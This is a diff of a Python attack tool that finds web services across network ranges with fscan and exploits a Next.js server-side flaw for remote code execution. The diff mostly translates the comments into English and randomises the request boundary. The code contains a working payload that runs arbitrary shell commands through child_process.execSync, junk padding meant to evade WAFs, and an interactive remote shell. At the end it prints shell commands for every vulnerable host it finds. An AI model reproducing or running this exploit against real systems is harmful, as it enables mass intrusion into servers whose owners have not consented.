@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-整合扫描脚本 - 结合 fscan 发现 web 服务 + scanner.py 检测漏洞 + RCE 利用
-支持 fscan 自动下载、可配置参数、RCE 命令执行
+Integrated Scanner - Combines fscan web discovery + scanner.py vulnerability detection + RCE exploitation
+Supports fscan auto-download, configurable parameters, and RCE command execution
 """
 
 import argparse
@@ -23,11 +23,11 @@ import requests
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# 导入 scanner.py 的功能
+# Import scanner.py functions
 from scanner import check_vulnerability, Colors, colorize, print_result, save_results, print_banner
 
 
-# ==================== fscan 自动下载 ====================
+# ==================== fscan Auto Download ====================
 
 FSCAN_RELEASES = {
     "linux_amd64": "https://github.com/shadow1ng/fscan/releases/download/1.8.4/fscan_amd64",
@@ -39,7 +39,7 @@ FSCAN_RELEASES = {
 
 
 def get_system_arch():
-    """获取系统架构"""
+    """Get system architecture"""
     system = platform.system().lower()
     machine = platform.machine().lower()
 
@@ -54,36 +54,36 @@ def get_system_arch():
 
 
 def download_fscan(dest_path: str) -> bool:
-    """自动下载 fscan"""
+    """Auto download fscan"""
     arch = get_system_arch()
 
     if arch not in FSCAN_RELEASES:
-        print(colorize(f"[ERROR] 不支持的系统架构: {arch}", Colors.RED))
-        print(colorize(f"[*] 支持的架构: {', '.join(FSCAN_RELEASES.keys())}", Colors.YELLOW))
+        print(colorize(f"[ERROR] Unsupported architecture: {arch}", Colors.RED))
+        print(colorize(f"[*] Supported architectures: {', '.join(FSCAN_RELEASES.keys())}", Colors.YELLOW))
         return False
 
     url = FSCAN_RELEASES[arch]
-    print(colorize(f"[*] 正在下载 fscan ({arch})...", Colors.CYAN))
+    print(colorize(f"[*] Downloading fscan ({arch})...", Colors.CYAN))
     print(colorize(f"[*] URL: {url}", Colors.CYAN))
 
     try:
-        # 下载文件
+        # Download file
         urllib.request.urlretrieve(url, dest_path)
 
-        # 设置可执行权限 (非 Windows)
+        # Set executable permission (non-Windows)
         if not platform.system().lower().startswith("win"):
             os.chmod(dest_path, 0o755)
 
-        print(colorize(f"[+] fscan 下载成功: {dest_path}", Colors.GREEN))
+        print(colorize(f"[+] fscan downloaded successfully: {dest_path}", Colors.GREEN))
         return True
 
     except Exception as e:
-        print(colorize(f"[ERROR] 下载 fscan 失败: {e}", Colors.RED))
+        print(colorize(f"[ERROR] Failed to download fscan: {e}", Colors.RED))
         return False
 
 
 def ensure_fscan(script_dir: str) -> str:
-    """确保 fscan 存在，不存在则自动下载"""
+    """Ensure fscan exists, auto download if not"""
     if platform.system().lower().startswith("win"):
         fscan_name = "fscan.exe"
     else:
@@ -94,7 +94,7 @@ def ensure_fscan(script_dir: str) -> str:
     if os.path.exists(fscan_path):
         return fscan_path
 
-    print(colorize("[*] fscan 不存在，尝试自动下载...", Colors.YELLOW))
+    print(colorize("[*] fscan not found, attempting auto download...", Colors.YELLOW))
 
     if download_fscan(fscan_path):
         return fscan_path
@@ -102,28 +102,28 @@ def ensure_fscan(script_dir: str) -> str:
     return None
 
 
-# ==================== fscan 扫描 ====================
+# ==================== fscan Scanning ====================
 
 def run_fscan(target: str, ports: str = "1-65535", threads: int = 100,
               timeout: int = 3, no_ping: bool = False, fscan_path: str = None) -> str:
     """
-    运行 fscan 扫描目标，发现 web 服务
+    Run fscan to scan target and discover web services
     """
     if fscan_path is None:
         script_dir = os.path.dirname(os.path.abspath(__file__))
         fscan_path = ensure_fscan(script_dir)
 
     if fscan_path is None or not os.path.exists(fscan_path):
-        print(colorize("[ERROR] fscan 不存在且无法下载", Colors.RED))
+        print(colorize("[ERROR] fscan not found and cannot be downloaded", Colors.RED))
         sys.exit(1)
 
-    # 创建临时输出文件
+    # Create temporary output file
     with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
         output_file = f.name
 
-    print(colorize(f"[*] 开始 fscan 扫描: {target}", Colors.CYAN))
-    print(colorize(f"[*] 端口范围: {ports}", Colors.CYAN))
-    print(colorize(f"[*] 线程数: {threads}", Colors.CYAN))
+    print(colorize(f"[*] Starting fscan scan: {target}", Colors.CYAN))
+    print(colorize(f"[*] Port range: {ports}", Colors.CYAN))
+    print(colorize(f"[*] Threads: {threads}", Colors.CYAN))
     print(colorize(f"[*] No Ping: {no_ping}", Colors.CYAN))
     print()
 
@@ -134,12 +134,12 @@ def run_fscan(target: str, ports: str = "1-65535", threads: int = 100,
         "-t", str(threads),
         "-time", str(timeout),
         "-o", output_file,
-        "-nobr",      # 不进行暴力破解
-        "-nopoc",     # 不运行 poc (我们用 scanner.py)
+        "-nobr",      # Disable brute force
+        "-nopoc",     # Disable poc (we use scanner.py)
         "-nocolor"
     ]
 
-    # 可选: 不 ping
+    # Optional: no ping
     if no_ping:
         cmd.append("-np")
 
@@ -151,13 +151,13 @@ def run_fscan(target: str, ports: str = "1-65535", threads: int = 100,
             text=True
         )
 
-        # 实时输出 fscan 结果
+        # Real-time output of fscan results
         for line in process.stdout:
             print(line.rstrip())
 
         process.wait()
 
-        # 读取输出文件
+        # Read output file
         if os.path.exists(output_file):
             with open(output_file, 'r') as f:
                 result = f.read()
@@ -166,28 +166,28 @@ def run_fscan(target: str, ports: str = "1-65535", threads: int = 100,
         return ""
 
     except Exception as e:
-        print(colorize(f"[ERROR] fscan 执行失败: {e}", Colors.RED))
+        print(colorize(f"[ERROR] fscan execution failed: {e}", Colors.RED))
         return ""
 
 
 def extract_web_urls(fscan_output: str) -> list:
     """
-    从 fscan 输出中提取 web 服务 URL
+    Extract web service URLs from fscan output
     """
     urls = set()
 
     patterns = [
         r'(https?://[\d\.]+:\d+)',           # http://ip:port
-        r'(https?://[\d\.]+)',                # http://ip (默认端口)
-        r'\[WebTitle\]\s+(https?://[^\s]+)',  # WebTitle 行
-        r'WebTitle\s+(https?://[^\s]+)',      # WebTitle 无括号
+        r'(https?://[\d\.]+)',                # http://ip (default port)
+        r'\[WebTitle\]\s+(https?://[^\s]+)',  # WebTitle line
+        r'WebTitle\s+(https?://[^\s]+)',      # WebTitle without brackets
     ]
 
     for pattern in patterns:
         matches = re.findall(pattern, fscan_output)
         urls.update(matches)
 
-    # 从开放端口构造 URL
+    # Construct URLs from open ports
     port_pattern = r'([\d\.]+):(\d+)\s+open'
     port_matches = re.findall(port_pattern, fscan_output)
 
@@ -204,17 +204,17 @@ def extract_web_urls(fscan_output: str) -> list:
     return sorted(list(urls))
 
 
-# ==================== 漏洞扫描 ====================
+# ==================== Vulnerability Scanning ====================
 
 def scan_vulnerabilities(urls: list, threads: int = 10, timeout: int = 10,
                          waf_bypass: bool = True, safe_check: bool = False,
                          verbose: bool = False) -> tuple:
     """
-    使用 scanner.py 扫描漏洞
+    Scan for vulnerabilities using scanner.py
     """
     print()
     print(colorize("=" * 60, Colors.CYAN))
-    print(colorize(f"[*] 开始漏洞检测，共 {len(urls)} 个目标", Colors.CYAN))
+    print(colorize(f"[*] Starting vulnerability detection, {len(urls)} targets", Colors.CYAN))
     print(colorize("=" * 60, Colors.CYAN))
     print()
 
@@ -242,7 +242,7 @@ def scan_vulnerabilities(urls: list, threads: int = 10, timeout: int = 10,
         from tqdm import tqdm
         with tqdm(
             total=len(urls),
-            desc=colorize("漏洞检测", Colors.CYAN),
+            desc=colorize("Scanning", Colors.CYAN),
             unit="url",
             ncols=80
         ) as pbar:
@@ -268,17 +268,24 @@ def scan_vulnerabilities(urls: list, threads: int = 10, timeout: int = 10,
     return results, vulnerable_count, error_count
 
 
-# ==================== RCE 利用 ====================
+# ==================== RCE Exploitation ====================
+
+def generate_boundary():
+    """Generate random WebKit form boundary"""
+    chars = string.ascii_letters + string.digits
+    return '----WebKitFormBoundary' + ''.join(random.choices(chars, k=16))
+
 
 def execute_rce(target: str, cmd: str, timeout: int = 30) -> str:
     """
-    通过 Next.js RCE 漏洞执行命令并返回输出
+    Execute command via Next.js RCE vulnerability and return output
     """
-    boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
+    boundary = generate_boundary()
 
-    # 构建 payload - base64 编码输出便于提取
+    # Build payload - base64 encode output for easy extraction
+    # Use execSync with timeout:5000 (5s) to prevent long-term blocking that could crash the service
     prefix_payload = (
-        f"var res=process.mainModule.require('child_process').execSync('{cmd}|base64 -w0')"
+        f"var res=process.mainModule.require('child_process').execSync('{cmd}|base64 -w0',{{timeout:5000}})"
         f".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"
         "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});"
     )
@@ -290,20 +297,20 @@ def execute_rce(target: str, cmd: str, timeout: int = 30) -> str:
         + '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}'
     )
 
-    # 生成 128KB junk data 用于 WAF bypass
+    # Generate 128KB junk data for WAF bypass
     param_name = ''.join(random.choices(string.ascii_lowercase, k=12))
     junk = ''.join(random.choices(string.ascii_letters + string.digits, k=128*1024))
 
     parts = []
-    parts.append(f'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n'
+    parts.append(f'--{boundary}\r\n'
                  f'Content-Disposition: form-data; name="{param_name}"\r\n\r\n{junk}\r\n')
-    parts.append(f'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n'
+    parts.append(f'--{boundary}\r\n'
                  f'Content-Disposition: form-data; name="0"\r\n\r\n{part0}\r\n')
-    parts.append(f'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n'
+    parts.append(f'--{boundary}\r\n'
                  f'Content-Disposition: form-data; name="1"\r\n\r\n"$@0"\r\n')
-    parts.append(f'------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n'
+    parts.append(f'--{boundary}\r\n'
                  f'Content-Disposition: form-data; name="2"\r\n\r\n[]\r\n')
-    parts.append('------WebKitFormBoundaryx8jO2oVc6SWP3Sad--\r\n')
+    parts.append(f'--{boundary}--\r\n')
 
     body = ''.join(parts)
 
@@ -315,7 +322,7 @@ def execute_rce(target: str, cmd: str, timeout: int = 30) -> str:
         'X-Nextjs-Html-Request-Id': 'SSTMXm7OJ_g0Ncx6jpQt9',
     }
 
-    # 确保 target 以 / 结尾
+    # Ensure target ends with /
     if not target.endswith('/'):
         target = target + '/'
 
@@ -338,9 +345,9 @@ def execute_rce(target: str, cmd: str, timeout: int = 30) -> str:
 
 
 def interactive_shell(target: str):
-    """交互式 shell"""
-    print(colorize(f"\n[*] 进入交互式 shell - 目标: {target}", Colors.CYAN))
-    print(colorize("[*] 输入 'exit' 或 'quit' 退出\n", Colors.CYAN))
+    """Interactive shell"""
+    print(colorize(f"\n[*] Entering interactive shell - Target: {target}", Colors.CYAN))
+    print(colorize("[*] Type 'exit' or 'quit' to exit\n", Colors.CYAN))
 
     while True:
         try:
@@ -348,146 +355,146 @@ def interactive_shell(target: str):
             if not cmd:
                 continue
             if cmd.lower() in ('exit', 'quit'):
-                print(colorize("[*] 退出交互式 shell", Colors.CYAN))
+                print(colorize("[*] Exiting interactive shell", Colors.CYAN))
                 break
 
             output = execute_rce(target, cmd)
             print(output)
 
         except KeyboardInterrupt:
-            print(colorize("\n[*] 退出交互式 shell", Colors.CYAN))
+            print(colorize("\n[*] Exiting interactive shell", Colors.CYAN))
             break
         except EOFError:
             break
 
 
-# ==================== 主函数 ====================
+# ==================== Main Function ====================
 
 def main():
     parser = argparse.ArgumentParser(
-        description="整合扫描工具 - fscan + React2Shell Scanner + RCE",
+        description="Integrated Scanner - fscan + React2Shell Scanner + RCE",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
-示例:
-  扫描网段:
+Examples:
+  Scan network:
     %(prog)s -t 192.168.1.0/24
     %(prog)s -t 192.168.1.0/24 -p 80,443,8080 --fscan-threads 1000
-    %(prog)s -t 192.168.1.0/24 --no-ping  # 启用 ping 发现存活主机
+    %(prog)s -t 192.168.1.0/24 --no-ping  # Scan all IPs without ping discovery
 
-  执行 RCE:
+  Execute RCE:
     %(prog)s --rce http://192.168.1.x:5000 --cmd "id"
-    %(prog)s --rce http://192.168.1.x:5000 --shell  # 交互式 shell
+    %(prog)s --rce http://192.168.1.x:5000 --shell  # Interactive shell
         """
     )
 
-    # 扫描参数
-    scan_group = parser.add_argument_group('扫描选项')
+    # Scan parameters
+    scan_group = parser.add_argument_group('Scan Options')
     scan_group.add_argument(
         "-t", "--target",
-        help="目标 IP 或 CIDR (如: 192.168.1.0/24)"
+        help="Target IP or CIDR (e.g., 192.168.1.0/24)"
     )
     scan_group.add_argument(
         "-p", "--ports",
         default="1-65535",
-        help="端口范围 (默认: 1-65535)"
+        help="Port range (default: 1-65535)"
     )
     scan_group.add_argument(
         "--fscan-threads",
         type=int,
         default=500,
-        help="fscan 线程数 (默认: 500)"
+        help="fscan threads (default: 500)"
     )
     scan_group.add_argument(
         "--scan-threads",
         type=int,
         default=20,
-        help="漏洞扫描线程数 (默认: 20)"
+        help="Vulnerability scan threads (default: 20)"
     )
     scan_group.add_argument(
         "--timeout",
         type=int,
         default=15,
-        help="请求超时时间 (默认: 15秒)"
+        help="Request timeout in seconds (default: 15)"
     )
     scan_group.add_argument(
         "--no-ping",
         action="store_true",
-        help="fscan 不使用 ping (扫描全部IP，较慢)"
+        help="fscan without ping (scan all IPs, slower)"
     )
     scan_group.add_argument(
         "-o", "--output",
-        help="输出结果到 JSON 文件"
+        help="Output results to JSON file"
     )
     scan_group.add_argument(
         "--safe-check",
         action="store_true",
-        help="使用安全的侧信道检测而非 RCE PoC"
+        help="Use safe side-channel detection instead of RCE PoC"
     )
     scan_group.add_argument(
         "--no-waf-bypass",
         action="store_true",
-        help="禁用 WAF 绕过"
+        help="Disable WAF bypass"
     )
     scan_group.add_argument(
         "-v", "--verbose",
         action="store_true",
-        help="详细输出"
+        help="Verbose output"
     )
     scan_group.add_argument(
         "--skip-fscan",
-        help="跳过 fscan，直接从文件加载 URL 列表"
+        help="Skip fscan and load URL list from file"
     )
 
-    # RCE 参数
-    rce_group = parser.add_argument_group('RCE 利用选项')
+    # RCE parameters
+    rce_group = parser.add_argument_group('RCE Exploitation Options')
     rce_group.add_argument(
         "--rce",
         metavar="URL",
-        help="对指定目标执行 RCE"
+        help="Execute RCE on specified target"
     )
     rce_group.add_argument(
         "--cmd",
-        help="要执行的命令"
+        help="Command to execute"
     )
     rce_group.add_argument(
         "--shell",
         action="store_true",
-        help="进入交互式 shell"
+        help="Enter interactive shell"
     )
 
     args = parser.parse_args()
 
-    # RCE 模式
+    # RCE mode
     if args.rce:
         print_banner()
-        print(colorize("[*] RCE 利用模式", Colors.CYAN))
+        print(colorize("[*] RCE Exploitation Mode", Colors.CYAN))
 
         if args.shell:
             interactive_shell(args.rce)
         elif args.cmd:
-            print(colorize(f"[*] 目标: {args.rce}", Colors.CYAN))
-            print(colorize(f"[*] 命令: {args.cmd}", Colors.CYAN))
+            print(colorize(f"[*] Target: {args.rce}", Colors.CYAN))
+            print(colorize(f"[*] Command: {args.cmd}", Colors.CYAN))
             print()
             output = execute_rce(args.rce, args.cmd, args.timeout)
-            print(colorize("[+] 输出:", Colors.GREEN))
+            print(colorize("[+] Output:", Colors.GREEN))
             print(output)
         else:
-            print(colorize("[ERROR] RCE 模式需要指定 --cmd 或 --shell", Colors.RED))
+            print(colorize("[ERROR] RCE mode requires --cmd or --shell", Colors.RED))
             sys.exit(1)
         return
 
-    # 扫描模式
+    # Scan mode
     if not args.target and not args.skip_fscan:
         parser.print_help()
         sys.exit(1)
 
     print_banner()
-    print(colorize("[*] 整合扫描模式: fscan + React2Shell Scanner", Colors.CYAN))
+    print(colorize("[*] Integrated Scan Mode: fscan + React2Shell Scanner", Colors.CYAN))
     print()
 
-    # 步骤1: 运行 fscan 或加载 URL 列表
+    # Step 1: Run fscan or load URL list
     if args.skip_fscan:
-        print(colorize(f"[*] 从文件加载 URL: {args.skip_fscan}", Colors.CYAN))
+        print(colorize(f"[*] Loading URLs from file: {args.skip_fscan}", Colors.CYAN))
         with open(args.skip_fscan, 'r') as f:
             urls = [line.strip() for line in f if line.strip() and line.strip().startswith('http')]
     else:
@@ -498,22 +505,22 @@ def main():
             no_ping=args.no_ping
         )
 
-        # 步骤2: 提取 web URL
+        # Step 2: Extract web URLs
         urls = extract_web_urls(fscan_output)
 
     if not urls:
-        print(colorize("[!] 未发现任何 web 服务", Colors.YELLOW))
+        print(colorize("[!] No web services found", Colors.YELLOW))
         sys.exit(0)
 
     print()
-    print(colorize(f"[+] 发现 {len(urls)} 个 web 服务:", Colors.GREEN))
+    print(colorize(f"[+] Found {len(urls)} web services:", Colors.GREEN))
     for url in urls[:20]:
         print(f"    {url}")
     if len(urls) > 20:
-        print(f"    ... 还有 {len(urls) - 20} 个")
+        print(f"    ... and {len(urls) - 20} more")
     print()
 
-    # 步骤3: 漏洞扫描
+    # Step 3: Vulnerability scan
     results, vulnerable_count, error_count = scan_vulnerabilities(
         urls,
         threads=args.scan_threads,
@@ -523,37 +530,37 @@ def main():
         verbose=args.verbose
     )
 
-    # 输出总结
+    # Output summary
     print()
     print(colorize("=" * 60, Colors.CYAN))
-    print(colorize("扫描总结", Colors.BOLD))
+    print(colorize("Scan Summary", Colors.BOLD))
     print(colorize("=" * 60, Colors.CYAN))
-    print(f"  扫描目标: {args.target or args.skip_fscan}")
-    print(f"  发现 Web 服务: {len(urls)}")
+    print(f"  Target: {args.target or args.skip_fscan}")
+    print(f"  Web Services Found: {len(urls)}")
 
     if vulnerable_count > 0:
-        print(f"  {colorize(f'存在漏洞: {vulnerable_count}', Colors.RED + Colors.BOLD)}")
+        print(f"  {colorize(f'Vulnerable: {vulnerable_count}', Colors.RED + Colors.BOLD)}")
 
-        # 列出存在漏洞的目标
+        # List vulnerable targets
         print()
-        print(colorize("  存在漏洞的目标:", Colors.RED))
+        print(colorize("  Vulnerable Targets:", Colors.RED))
         for r in results:
             if r.get("vulnerable"):
                 print(colorize(f"    - {r['host']}", Colors.RED))
         print()
-        print(colorize("  使用以下命令执行 RCE:", Colors.YELLOW))
+        print(colorize("  Execute RCE with:", Colors.YELLOW))
         for r in results:
             if r.get("vulnerable"):
                 print(colorize(f"    python3 {sys.argv[0]} --rce {r['host']} --shell", Colors.YELLOW))
                 break
     else:
-        print(f"  存在漏洞: {vulnerable_count}")
+        print(f"  Vulnerable: {vulnerable_count}")
 
-    print(f"  无漏洞: {len(urls) - vulnerable_count - error_count}")
-    print(f"  错误: {error_count}")
+    print(f"  Not Vulnerable: {len(urls) - vulnerable_count - error_count}")
+    print(f"  Errors: {error_count}")
     print(colorize("=" * 60, Colors.CYAN))
 
-    # 保存结果
+    # Save results
     if args.output:
         save_results(results, args.output, vulnerable_only=False)
 
